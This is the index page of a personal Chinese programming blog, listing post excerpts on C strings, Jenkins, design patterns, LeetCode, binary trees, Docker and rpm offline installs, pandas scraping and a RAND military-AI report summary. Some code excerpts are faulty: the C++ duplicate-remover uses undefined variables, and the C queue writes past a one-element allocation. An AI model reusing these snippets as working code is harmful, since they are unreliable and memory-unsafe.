<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.122.0">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>追风少年的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="追风少年的博客">
		<meta property="og:title" content="追风少年的博客" />
<meta property="og:description" content="追风少年的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://zhuifengsn.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="追风少年的博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="追风少年的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">追风少年的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89580f0979e24ab458979e672422dfbd/" rel="bookmark">
			C语言字符串
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字符串 c 语言没有专门用于存储字符串的变量类型，字符串都被存储在 char 类型的数组中。数组由连续的存储单元组成，字符串中的字符被存储在相邻的存储单元中，每个单元存储一个字符，c 语言用数组末尾的字符 \o 标记字符串的结束。
c 中的字符串一定是以空字符结束，这意味着数组的容量必须至少比待存储字符串的字符数多 1，以上图中有14个存储单元，却只能存储13个字符，剩下一个字节留给空字符。 字符串常量 用双引号括起来的内容称为字符串的字面量，也叫做字符串常量。双引号中的字符和编译器自动加入末尾的 \0 字符，都作为字符串存储在内存中，如：” hello world ! ” 、” good morning “ 、 “ i am a student ” 都是字符串字面量。另外注意一点，你的字符串字面量之间如果没有间隔，或用空白字符分隔，c 会自动将它们串联起来。
#include&lt;stdio.h&gt; int main(void) { char a[]="hello ""world " "!"; char b[]="hello world !"; printf("a[]=%s b[]=%s\n",a,b); return 0; } 它们的输出是相同的：
字符串变量 我们字符串变量一般有两种方法创建，指针或者是数组
#include&lt;stdio.h&gt; int main(void) { char a[]="hello world !"; //数组 char* b=" hello world !"; //指针 } 数组形式（ a [ ] ）在计算机的内存中分配为一个内含14个元素的数组，每个元素初始化为字符串字面量对应的字符。通常，字符串都作为可执行文件的一部分存储在数据段中。当把程序载入内存时，也载入了程序中的字符串。字符串存储在静态存储区中，但是，程序在开始运行时才会为该数组分配内存。此时才将字符串拷贝到数组中，此时字符串有两份，一个是在静态内存中的字符串字面量，另一个是存储在 a[ ] 数组中的字符串。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/89580f0979e24ab458979e672422dfbd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d70ad0281389b8e12d550a64505ea144/" rel="bookmark">
			Jenkins如何使用以及配置环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Jenkins如何使用以及配置环境
点击Manage Jenkins，进入到管理页面
点击 Global Tool Configuration，进入到全局配置。
Maven 配置，按照图示配置
JDK配置
Git配置
以上是具体的Jenkins配置，下面是具体的新建一个项目
在主页面，点击新建item，就可以打开新建项目的页面
往下找到源码管理，使用你需要的源码方式，这里我使用的是Git
构建触发器选择以下选项
build构建项目，采用maven
然后点击保存，应用，一个项目就创建好了。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73537062eff89e1afbf7c2ff8deccbc9/" rel="bookmark">
			原型模式（深克隆、浅克隆）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		上期回顾：建造者模式
文章目录 一、原型模式定义二、原型模式的结构与实现三、案例（一）浅克隆（二）深克隆（三）浅克隆和深克隆的区别 四、原型模式使用场景 一、原型模式定义 原型模式是一种创建型设计模式，Prototype模式允许一个对象再创建另外一个可定制的对象，根本无需知道任何如何创建的细节,工作原理是:通过将一个原型对象传给那个要发动创建的对象，这个要发动创建的对象通过请求原型对象拷贝它们自己来实施创建。
二、原型模式的结构与实现 原型模式有以下三种角色：
1.抽象原型类（Prototype）：规定了具体原型对象必须实现的接口。
2.具体原型类（Realizetype）：实现抽象原型类的 clone() 方法，它是可被复制的对象。
3.访问类（PrototypeTest）：使用具体原型类中的 clone() 方法来复制新的对象
原型模式的克隆可以分为浅克隆和深克隆
浅克隆：创建一个新对象，新对象的属性和原来对象完全相同，对于非基本类型属性，仍指向原有属性所指向的对象的内存地址。
深克隆：创建一个新对象，属性中引用的其他对象也会被克隆，不再指向原有对象地址。
Java中的Object类中提供clone()方法来实现浅克隆。Cloneable接口就是抽象原型类，而实现了Cloneable接口的子实现类就是具体的原型类。
原型模式设计如下：
//在这里抽象原型类是Cloneable接口 //具体原型类 public class Realizetype implements Cloneable{ public Realizetype() { System.out.println("具体原型对象已创建成功！"); } @Override protected Realizetype clone() throws CloneNotSupportedException { System.out.println("具体原型已复制成功！"); return (Realizetype) super.clone(); } } //访问类 public class Client { public static void main(String[] args) throws CloneNotSupportedException { //创建一个原型类对象 Realizetype realizetype = new Realizetype(); //得到原型对象的克隆对象 Realizetype clone = realizetype.clone(); //查看是否是同一个对象 System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73537062eff89e1afbf7c2ff8deccbc9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ee2b0c5eed2b89972932ec8cfd50b17/" rel="bookmark">
			【4.22-周五】lc贪心问题：55 &amp;&amp; 45
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		lc贪心问题：55 &amp;&amp; 45 55.跳跃游戏思路分析代码 45.跳跃游戏||思路分析代码 55.跳跃游戏 链接直达
思路分析 思路清晰：我们可以在任何一个点停下，所以将这个点+这个点的num[i]，也就是表示这个点是否可以达到数组最后一个元素只要两者之和大于等于数组最后一个元素下标就算成功 代码 class Solution { public boolean canJump(int[] nums) { if(nums.length == 1) return true; int distance = 0; for(int i = 0; i &lt;= distance; i++){ distance = Math.max(distance, i + nums[i]); if(distance &gt;= nums.length - 1){ return true; } } return false; } } 45.跳跃游戏|| 链接直达
思路分析 ||肯定是要难一点的。错误分析：思考循环，考虑到【2，3，1，1，4】中下标为0的2，可以跳一步，也可以跳两步。其他点也是如此，瞬间想到了回溯。for-back开始一顿狂写。。。思考与上题的关联，我们依旧是可能在任意点停下，i+nums[i]是肯定需要的，只要这个值大于数组下标长度，那么这条跳跃的路线一定是成立的，所以我们只需要找到使用跳跃次数最短的这种路线。维护一个count表示次数，贪心，在迫到不得已的情况下，我们才选择跳一下~~~什么情况下是迫不得已，当前所在的跳跃范围已经到了极限了，我们就需要跳一下了！ 代码 class Solution { public int jump(int[] nums) { if(nums.length == 0 || nums.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ee2b0c5eed2b89972932ec8cfd50b17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6f319b15195f9b7cb0c2830b30425724/" rel="bookmark">
			报错incorrect username or password ( access token )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		控制面板-&gt;用户账户-&gt;凭证管理器-Windows凭证找到 git:https://gitee.com点击编辑，修改密码 使用该过程，无效，全部删除，在gitee上重新换个密码，重新验证登录
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1c2375c2bd9c38cb631ecae99a87a72/" rel="bookmark">
			美国兰德提出《在联合全域指挥控制中发展人工智能的路径》报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源：防务快讯
2022年3月，美国兰德公司发布《开发嵌入人工智能应用的联合全域指挥控制作战概念》报告，论述了嵌入人工智能/机器学习（AI/ML）的联合全域指挥控制（JADC2）的需求，说明了如何在JADC2中利用商业AI/ML系统和需要克服的障碍，并指出了发展路径。报告认为，为实现嵌入人工智能应用的JADC2，需要投入人力和资源来超越如今的人力密集型指挥控制模式，用自动化和AI/ML技术改进当前的规划过程。
报告核心观点包括：
①将AI/ML纳入JADC2之前需要建立“信息基础”；
②实现JADC2目标的关键是确定核心军事任务的指挥控制需求并建立可行的软件开发计划；
③将商业AI/ML系统用于军事任务，必须确定技术支持的作战需求、随后确定实现作战任务所需的指挥控制过程，同时了解AI/ML技术的局限性；
④在JADC2中应用AI/ML需要克服四个障碍：军事文化与商业文化的差异、数据不可访问、重组军事行动中心并培训人员、军事亚文化；
⑤在JADC2中应用AI/ML的目标是实现指挥控制的高效人机组队，而不是指挥控制的完全自动化。
将人工智能（AI）和机器学习（ML）纳入JADC2进行多域作战（MDO）之前要完成一项艰巨的任务，即建立“信息基础”。信息基础中的数据带有标记，能够安全地存储和传输，且易于访问。建立信息基础需要持续整理和保护军方为开展指挥控制所需的跨领域、跨军种和跨梯队的所有信息。这些信息是AI和ML算法所需的输入。如果没有这样一个信息基础，将AI融入JADC2的工作就无法取得进展。
尽管最近AI/ML在游戏领域取得了令人鼓舞的成功，但考虑到信息不完整、数据质量差和对手行动等现实障碍，在某些指挥控制功能中使用类似的技术仍具有挑战性。其他AI/ML技术，例如用于预测战区内飞机状态的应用，其成熟度更高。实现JADC2目标取决于确定核心军事任务集的指挥控制需求，以及建立在近期和远期都可以实现的软件开发计划。
1
JADC2对支撑多域作战的必要性
今天的军事行动已经需要灵活和安全的手段来跨梯队、领域、组织和地理区域进行通信和共享数据。未来的全域战争和竞争将对获取信息的规模和速度、对信息的理解和快速决策提出更高的要求，这些都是JADC2能力的关键要素。
但是，今天用于规划、调度和执行监视军事任务的既存系统和基础设施不适用于现代全域作战。鉴于多域作战规划日益复杂，期限缩短，而且数据要求增加，军事规划人员需要新的工具，包括AI/ML工具。
要想确定对AI/ML工具投入的优先级，就需要了解这些工具的能力、面临的障碍以及它们满足多域作战下新兴指挥控制需求的潜力。
图1 机器学习的类型
2
如何利用商业AI/ML系统
随着人工智能算法被开发用于现实、动态、多领域、大规模和快节奏的作战，需要选择、评估和监控重要的度量标准来衡量算法的性能、有效性和适用性。关键的算法度量标准包括：效率、可靠性、最优性、鲁棒性、可解释性和确定性。
由于商业和学术AI/ML系统没有直接应用于军事任务，这些技术需要过渡到军事环境才能带来作战优势。为了决定采用哪些AI/ML技术，军方必须首先了解需要这些技术支持哪些作战需求，如空中优势、防空、加油机支持等。随后作战需求将决定实现作战任务所需的指挥控制过程，如态势感知、空域去冲突等。了解AI/ML技术的局限性，尤其是它们在不确定条件下进行推理时遇到的困难，也同样重要。否则，这些技术可能会达不到预期。
图2 AI/ML关系
3
实现AI/ML的军事应用需要克服的障碍
实现AI/ML的军事应用存在以下四个主要障碍。
（１）军事文化与商业文化的差异
（２）军方内部数据不可访问
（３）需要重组军事行动中心并培训中心的人员
（４）存在军事亚文化 4
实现高效发展的路径
我们的目标不应该是指挥控制的完全自动化，而是指挥控制的高效人机组队。实现这一目标的步骤应该包括：第一，继续开发JADC2作战概念并确定其优先次序；第二，在指挥控制过程中确定采用AI/ML来增强能力的需求和机会。
未来智能实验室的主要工作包括：建立AI智能系统智商评测体系，开展世界人工智能智商评测；开展互联网（城市）大脑研究计划，构建互联网（城市）大脑技术和企业图谱，为提升企业，行业与城市的智能水平服务。每日推荐范围未来科技发展趋势的学习型文章。目前线上平台已收藏上千篇精华前沿科技文章和报告。
如果您对实验室的研究感兴趣，欢迎加入未来智能实验室线上平台。扫描以下二维码或点击本文左下角“阅读原文”
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfc7a2c8fa5649dad0a06ddecdc6e1fa/" rel="bookmark">
			XX银行的U盾插在ESXi6.7机器添加USB控制器无法识别，配置直通模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		XX银行的U盾ESXi6.7机器添加USB控制器无法识别，只能配置直通模式，因为人不在现场，只能把服务器的USB都改为直通模式，添加到虚拟机。
进入esxi6.7后台，点管理-硬件-PCI设备，勾选所有USB设备，切换直通。
改为直通模式需要重启服务器，重启服务器前先把本机的虚拟机全部迁移走，然后重启。
关闭虚拟机，右上角添加新设备-PCI设备-开启直通的USB设备会直接显示，直接添加。
内存勾选预留所有客户机内存，不勾选无法开机。
开机后直接识别U盾。
直通模式只限于无法找到U盘，无法识别的usb设备。银行设备比较特殊，usb无法直接识别，所以采用直通模式。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71e01a6ee30cfcedf79c3d449184f002/" rel="bookmark">
			C语言《数据结构》———顺序队列
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：写完文章后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言能够熟练掌握顺序队列，掌握它的特点，方便后面用来解决某些问题，例如二叉数的层序遍历; 一、什么是顺序队列二、代码实现1.创建顺序表2.入队，出队操作3.源代码 总结 前言 能够熟练掌握顺序队列，掌握它的特点，方便后面用来解决某些问题，例如二叉数的层序遍历; 提示：以下是本篇文章正文内容，下面案例可供参考
*在这里插入代码片* 一、什么是顺序队列 顺序队列是队列的顺序存储结构，顺序队列实际上是运算受限的顺序表。和顺序表一样，顺序队列用一个向量空间来存放当前队列中的元素。由于队列的队头和队尾的位置是变化的，设置两个指针front和rear分别指示队头元素和队尾元素在向量空间中的位置，它们的初值在队列初始化时均应设置为0。
二、代码实现 1.创建顺序表 代码如下（示例）：
typedef struct Sequeue { elemstyle* data; int top; int rear; }SeqQueue; //队列初始化; SeqQueue* Init_SeqQueue(SeqQueue* ps) { ps-&gt;data = (elemstyle*)malloc(sizeof(elemstyle)); ps-&gt;rear = ps-&gt;top = 0; return ps; } 2.入队，出队操作 代码如下（示例）：
//入队; void pushSeqQueue(SeqQueue* ps, int val) { assert(ps != NULL); ps-&gt;data[ps-&gt;rear++] = val; } //出队; int popSeqQueue(SeqQueue* ps) { assert(ps != NULL); if (ps-&gt;top != ps-&gt;rear) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/71e01a6ee30cfcedf79c3d449184f002/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7490db88e072c4611157923fdbbba912/" rel="bookmark">
			idea 怎么导入war包，idea怎么打开war包，idea怎么导出一个war包
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		盖伦：吾皇万岁！
文章目录 前言方法一：直接打开war解压后的文件（不建议）方法二：创建Java Enterprise项目（建议）导出一个war包总结 前言 我在网上搜索了许多怎么ideal怎么导入war，但是很多都是说怎么导出一个war包。
最初非常迷惘，老师给我们的war包我完全不知道该怎么去使用，这最主要的原因是我对war包没有正确的认识，虽不说我对war包了有了足够的认识但是确实比之前的困惑少了许多。
其实使用war包方式很多，你可以直接将它添加到tomcat server 中deployment中就可以直接运行了
但是我想要的是，可以对war包编辑并运行。
下面我有两种方式去使用一个war包，但是他们最终结果都是一样的。
方法一：直接打开war解压后的文件（不建议） 其实方法一是繁琐的，也是我不推荐的简单地说一下啊就好了
简述
将war包解压成一个文件夹ideal中直接打开你所解压出的文件
在project structure中project中 SDK 和language levelmodule中添加 web 并修改 web resoure directory 为该文件位置libraries中添加 tomcat文件中的libartifacts添加 web application exploded 然后选择 from module
添加tomca服务器run-&gt;edict configurations点击左上的“+”号，tomcat server-&gt;local自己弄server主要是在deployment中添加刚刚的artifact
最后就可以运行war包 方法二：创建Java Enterprise项目（建议） 为什么建议使用这个呢？因为这个是一个规范的项目模组很多不需要我们重新去配置。
创建Java Enterprise项目 project template选择web application
将war包解压
将解压后的war包直接拖入到创建的项目当中去
修改
file-&gt;project structure
选定module中的web
修改web resource directory为 你拖入到项目中文件
好了就这样了，你就直接运行就可以了。
导出一个war包 其实我发现还有很多方式去使用war包的。之所以像上文那样操作是为了导出war包。
导出war包很简单。
build-&gt;build artifacts
选择war -&gt;build（不要选war exploded）
在项目中的target文件中就可以见你导出的war包了。
总结 就是需要将你war包解压出的文件 让他成为一个web module
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7490db88e072c4611157923fdbbba912/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1e67d88b31c6ee736e2fe77998a86488/" rel="bookmark">
			查找二叉树、完全二叉树、线索二叉树、最优二叉树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、查找二叉树（二叉排序树）二、完全二叉树三、线索二叉树四、最优二叉树（哈夫曼树） 前言 2021年上半年 软件设计师 上午试卷中有这样一道题
58.当二叉树的结点数目确定时，________的高度一定是最小的。
A.二叉排序树 B.完全二叉树 C.线索二叉树 D.最优二叉树
我已此为契机，来了解一下查找二叉树、完全二叉树、线索二叉树、最优二叉树的一些相关定义（此题结尾会给出答案详解）
一、查找二叉树（二叉排序树） 二叉排序树的定义：
1、若根结点的左子树非空时，左子树上的所有结点均要小于根节点；
2、若根结点的右子树非空时，右子树上的所有结点均要大于根节点；
3、根结点的左、右子树本身又各是一颗二叉排序树
二叉排序树示例如图所示：
删除与插入
（一）插入结点
1、若查找二叉树为空树，则已要插入的新结点作为它的根节点
2、如果要插入的结点已存在，则不再插入。如上图若想要插入关键字为32的结点，已经存在了，就不进行插入操作。
3、将要插入的结点键值与插入后的父结点键值比较，如果小于则插入左子树，反之插入右子树中
（二）删除结点
1、若待删除结点是叶子结点（即没有左右孩子），则直接删除。例如上图中的88,，直接删除88元素。
2、若待删除结点只有左子树而无右子树，直接将其左孩子与待删除结点的父结点直接连接，例如：41
3、若待删除结点只有右子树而无左子树，直接将其右孩子与待删除结点的父结点直接连接，例如：66
4、若待删除结点p同时存在左、右子树，可以从其左子树选择键值最大的结点s，用结点s的值代替结点p的值，然后删除结点s，例如删除：54
二、完全二叉树 定义：若设二叉树的高度为h，除第 h 层外，其它各层 (1～h-1) 的结点数都达到最大个数，第 h
层若干结点靠左对齐，就说它是完全二叉树。
如下图所示：
上图两种都是完全二叉树，接下来我再给出不是完全二叉树的图，好做个对比
a和b都不满足完全二叉树的定义，a是因为第h层结点不满足左靠齐；b是因为除了第h层外，其它层结点个数结点未达到最大。
需要补充一点，满二叉树也是一颗完全二叉树，但是完全二叉树不一定是满二叉树
满二叉树定义
一个二叉树，如果每一个层的结点数都达到最大值，则这个二叉树就是满二叉树。也就是说，如果一个二叉树的深度为K，且结点总数是(2^k) -1，则它就是满二叉树。(一棵满二叉树的每一个结点要么是叶子结点，要么它有两个子结点，但是反过来不成立，因为完全二叉树也满足这个要求，但不是满二叉树)
三、线索二叉树 定义:在二叉树的结点上加上线索的二叉树称为线索二叉树，对二叉树以某种遍历方式（如先序、中序、后序或层次等）进行遍历，使其变为线索二叉树的过程称为对二叉树进行线索化。
单看定义还是有点抽象，我们先来了解一下为什么要有线索二叉树呢？
看下图中，我们发现在这颗树上存在着很懂指向null的指针（红色线），线索二叉树就是要让这些指针能够很好的运用上。
在二叉树存储结构中，因为每个结点中只有指向其左、右孩子的指针，所以从任一结点触发只能找到该节点的左、右孩子。在一般情况下靠它无法直接找到该结点在某种遍历序下的前驱和后继结点。但是若想在每个结点中增加指向其前驱和后继结点的指针，将降低存储空间的效率，所以引入线索二叉树。
对于n个结点的二叉树，在二叉链存储结构中有n+1个空链域（证明略），利用这些空链域存放在某种遍历次序下该结点的前驱结点和后继结点的指针，这些指针称为线索，加上线索的二叉树称为线索二叉树。
总结：线索链表解决了无法直接找到该结点在某种遍历序列中的前驱和后继结点的问题，解决了二叉链表找左、右孩子困难的问题。
根据线索性质的不同，线索二叉树可分为前序线索二叉树、中序线索二叉树和后序线索二叉树三种。
接下来介绍其中之一 ----- 前序线索二叉树
前序二叉树，顾名思义，就是按照前序遍历的方式。。。其中，左子树结点的指针指向当前遍历当中的前序结点。右子树结点的指针指向当前遍历的后序结点。比方说，在前序遍历模式中，遍历的顺序是按照“根–左--右”的方式进行的，好比在上图的BDE中
以前序遍历的方式，依次访问的是B、D、E。所以结点D的左孩子指针指向前序B结点，右孩子指针指向后序E结点，如上图所示。
记住前/中/后序遍历的口诀：“前”代表根先遍历，“中”代表根中间时刻遍历，“后”代表根最后遍历。
这样表示可能还不够直观，我们把上面前序线索二叉树的示例转换为前序遍历结果为：ABDEHCFGI
从图中可以就可以验证之前的结论，线索链表很好的解决了在某种遍历方式下查找二叉树结点的前驱和后继结点困难的问题，中序、后序线索二叉树就不展开讲了，原理都是一样的。
四、最优二叉树（哈夫曼树） 定义：给定N个权值作为N个叶子结点，构造一棵二叉树，若该树的带权路径长度达到最小，称这样的二叉树为最优二叉树，也称为哈夫曼树(Huffman Tree)。哈夫曼树是带权路径长度最短的树，权值较大的结点离根较近。
基本概念：
哈夫曼树又称为最优树.
1、路径和路径长度
在一棵树中，从一个结点往下可以达到的孩子或孙子结点之间的通路，称为路径。通路中分支的数目称为路径长度。若规定根结点的层数为1，则从根结点到第L层结点的路径长度为L-1。
2、结点的权及带权路径长度
若将树中结点赋给一个有着某种含义的数值，则这个数值称为该结点的权。结点的带权路径长度为：从根结点到该结点之间的路径长度与该结点的权的乘积。
3、树的带权路径长度
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1e67d88b31c6ee736e2fe77998a86488/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/11477b2360831076fb182e233df748e4/" rel="bookmark">
			Google中国编程挑战赛入围赛真题HardDuplicateRemover(1000分)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#include &lt;iostream&gt; #include &lt;vector&gt; #include &lt;map&gt; using namespace std; class HardDuplicateRemover { public: vector&lt;int&gt; process(vector&lt;int&gt;&amp; elements); }; vector&lt;int&gt; HardDuplicateRemover::process(vector&lt;int&gt;&amp; elements) { vector&lt;int&gt; result; if (elements.empty()) { cout &lt;&lt; "elements is empty!!!!!" &lt;&lt; endl; return result; } for (int i = 0; i &lt; elements.size(); i++) { int&amp; element = elements[i]; if (map.find(word) == map.end()) { cntIndex.push_back({ 1, i }); map.insert({ word, cntIndex.size() - 1 }); } else { cntIndex[map[word]].first++; } } return result; } int main(int argc, char *argv[]) { map&lt;int, vector&lt;int&gt;&gt; elements; // elements : {index} int tmp; vector&lt;int&gt; ints_sequence; while(cin &gt;&gt; tmp) { ints_sequence.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/11477b2360831076fb182e233df748e4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/33995d7a7a107bb79c41473163dfc365/" rel="bookmark">
			【Python奇淫技巧】用pandas的read_html函数仅一行代码实现网页爬虫
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、介绍read_html()函数
二、分析爬取目标页面
三、代码讲解
四、同步视频讲解
一、介绍read_html()函数 喜欢Python编程的小伙伴你知道吗，python的pandas库除了可以做数据分析，还可以做简易爬虫，仅需一行核心代码，就可以实现一个爬虫程序，轻轻松松爬取网页数据！
它就是pandas库的read_html()函数，实现python爬虫可以说是非常方便了。
这里需要说明的是，它只能针对网页上有&lt;table&gt;&lt;/table&gt;标签的表格数据进行爬取。
二、分析爬取目标页面 这里，我爬取的目标网址是：上海市天气预报_某网站
可以看到，页面上是有一个表格数据的，按F12打开开发者模式，查看网页源代码：
确实是有&lt;table&gt;标签的表格数据。那就好办了，开始撸代码！
三、代码讲解 代码总共3行，核心代码就1行：
import pandas as pd # 导入库 url = 'http://weather.sina.com.cn/china/shanghaishi/' # 目标网址(含有&lt;table&gt;的表格) df = pd.read_html(url)[1] # 开始爬取目标网站 这样短短3行代码，数据就爬取下来了。看一下爬下来的数据：
没问题，和原页面数据完全一致！后面在用pd.to_excel()把数据保存下来就OK了。
超级简单、强大有没有！
这里附上read_html()函数的官网参数说明，供小伙伴们参考：（贴心的我已经翻译成中文了^_^）
再次强调一遍，它只能针对网页上有&lt;table&gt;&lt;/table&gt;标签的表格数据进行爬取。
如果页面上没有&lt;table&gt;标签，用这个方法爬取的话，会提示"No tables found"的报错：
这是我用ipython界面截的图，用其他IDE也会这样报错的！
四、同步视频讲解 代码逐行讲解视频：
【爬虫神器】2分钟讲解用python一行代码轻松爬取网页数据
按以往的习惯，我都会分享Python源码文件，这次不用分享了吧，就3行代码，自己撸吧小伙伴！
同步公众号文章：
【Python爬虫奇淫技巧】 用pandas库read_html函数一行代码搞定爬虫！
我是马哥，全网累计粉丝上万，欢迎一起交流python技术。
各平台搜索“马哥python说”：知乎、哔哩哔哩、小红书、新浪微博。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4faeae57954ba7791df1e887828c3ac4/" rel="bookmark">
			docker离线安装方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		docker离线安装方法 下载地址：https://download.docker.com/linux/static/stable/x86_64/
参考文档：https://docs.docker.com/engine/install/binaries/
机房设备无法访问互联网原因，需要进行离线安装
K8S 生态周报| Docker和containerd 全版本漏洞公布,近期在 Docker 中发现了一个 影响所有版本的安全漏洞 CVE-2022-24769，该漏洞已经在 Docker 最新的版本 v20.10.14 中修复。建议安装docker-20.10.14 最新版本
一、安装docker 1.下载 Docker 二进制文件（离线安装包）
wget https://download.docker.com/linux/static/stable/x86_64/docker-20.10.14.tgz 2.通过mobaXterm等工具上传到服务器
3.解压安装包
tar -zxvf docker-20.10.14.tgz 4.将docker 相关命令拷贝到 /usr/bin
cp docker/* /usr/bin/ 5.docker注册成系统服务
vim /etc/systemd/system/docker.service [Unit] Description=Docker Application Container Engine Documentation=https://docs.docker.com After=network-online.target firewalld.service Wants=network-online.target [Service] Type=notify ExecStart=/usr/bin/dockerd ExecReload=/bin/kill -s HUP $MAINPID LimitNOFILE=infinity LimitNPROC=infinity TimeoutStartSec=0 Delegate=yes KillMode=process Restart=on-failure StartLimitBurst=3 StartLimitInterval=60s [Install] WantedBy=multi-user.target 6.添加执行权限
chmod +x /etc/systemd/system/docker.service 7.重新加载配置文件（每次有修改docker.service文件时都要重新加载下）
systemctl daemon-reload 8.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4faeae57954ba7791df1e887828c3ac4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/73ca60862b96de35bb3cf4749c7e0e33/" rel="bookmark">
			linux之yum下载rpm包离线安装conntrack-tools
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		如何下载rpm包，进行离线安装
文章目录 前言一.yum下载rpm包离线安装方式方法一:使用yum 的 downloadonly 插件下载方法二:使用yumdownloader下载方法三:使用repotrack下载所有依赖 二.下载conntrack-tools相关包1.获取依赖关系2.根据组织依赖下载包3.查看下载结果4.离线安装 rpm（未联网的环境也可以执行）5.测试 前言 ​ 通常生产环境由于安全原因都无法访问互联网。此时就需要进行离线安装，主要有两种方式：源码编译、rpm包安装。源码编译耗费时间长且缺乏编译环境，所以一般都选择使用离线 rpm 包安装。
一.yum下载rpm包离线安装方式 ​ 首先我们需要在可以上网的服务器上将需要安装软件的rpm离线包下载下来,然后拷贝到不能上网的服务器上安装。以下是几种下载的方法（联网的节点和生产环境的操作系统版本尽量接近，最好一致）
方法一:使用yum 的 downloadonly 插件下载 [root@iZbp1fy7y89tqjvmlp1dvhZ k8s]# yum install conntrack-tools --downloadonly --downloaddir=/opt/software/InstallPackages/conntrack-tools [root@iZbp1fy7y89tqjvmlp1dvhZ conntrack-tools]# ll total 268 -rw-r--r-- 1 root root 191000 Apr 4 2020 conntrack-tools-1.4.4-7.el7.x86_64.rpm -rw-r--r-- 1 root root 18400 Apr 4 2020 libnetfilter_cthelper-1.0.0-11.el7.x86_64.rpm -rw-r--r-- 1 root root 18212 Apr 4 2020 libnetfilter_cttimeout-1.0.0-7.el7.x86_64.rpm -rw-r--r-- 1 root root 23584 Aug 11 2017 libnetfilter_queue-1.0.2-2.el7_2.x86_64.rpm [root@iZbp1fy7y89tqjvmlp1dvhZ conntrack-tools]# ls |wc -l 4 使用yumdownloader、repotrack 这两个命令，必须先下载yum-utils才行。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/73ca60862b96de35bb3cf4749c7e0e33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec378d61604d6536cc3550f5a4552efa/" rel="bookmark">
			Mac弱网测试工具
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mac 弱网工具使用 （备注：Additional_Tools_for_Xcode可以从苹果开发者官网根据自己电脑的xcode版本号进行选择下载(这边上传的版本适用于xcode 13）
